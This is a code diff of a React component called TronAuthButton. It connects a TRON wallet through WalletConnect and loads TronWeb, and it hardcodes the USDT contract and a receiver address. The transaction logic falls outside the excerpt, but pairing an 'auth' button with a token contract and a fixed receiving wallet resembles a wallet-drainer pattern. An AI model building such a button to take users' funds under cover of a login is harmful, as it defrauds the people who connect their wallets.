@@ -1,10 +1,7 @@
-// src/components/tronAuthButton/TronAuthButton.tsx
-
 import React, { useState } from 'react';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
 
-// Не делаем import TronWeb сверху!
-
+// КОНСТАНТЫ
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
 
@@ -12,7 +9,7 @@ export const TronAuthButton: React.FC = () => {
   const [modal, setModal] = useState<string | null>(null);
   const [loading, setLoading] = useState(false);
 
-  // WalletConnectAdapter инициализируем один раз!
+  // Adapter — создаём один раз
   const adapterRef = React.useRef<any>(null);
   if (!adapterRef.current) {
     adapterRef.current = new WalletConnectAdapter({
@@ -31,24 +28,31 @@ export const TronAuthButton: React.FC = () => {
     });
   }
 
-  const handleAuth = async () => {
+  const handleAuth = async (e?: React.MouseEvent) => {
+    if (e) e.stopPropagation(); // чтобы не срабатывал родительский клик
     setLoading(true);
     setModal(null);
 
-    // ----!!! TronWeb require only here !!!----
+    // Проверка, что код на клиенте
+    if (typeof window === 'undefined') {
+      setModal('TronWeb not loaded (SSR)');
+      setLoading(false);
+      return;
+    }
+
+    // Импорт TronWeb только в браузере
     let TronWeb;
     try {
-      TronWeb = require('tronweb');
+      // @ts-ignore
+      TronWeb = window.TronWeb || require('tronweb');
     } catch (err) {
       setModal('TronWeb not loaded!');
       setLoading(false);
       return;
     }
 
-    // Buffer polyfill for browsers
-    if (typeof window !== 'undefined' && !window.Buffer) {
-      window.Buffer = require('buffer').Buffer;
-    }
+    // Buffer polyfill для браузера
+    if (!window.Buffer) window.Buffer = require('buffer').Buffer;
 
     const tronWeb = new TronWeb({
       fullHost: 'https://api.trongrid.io',
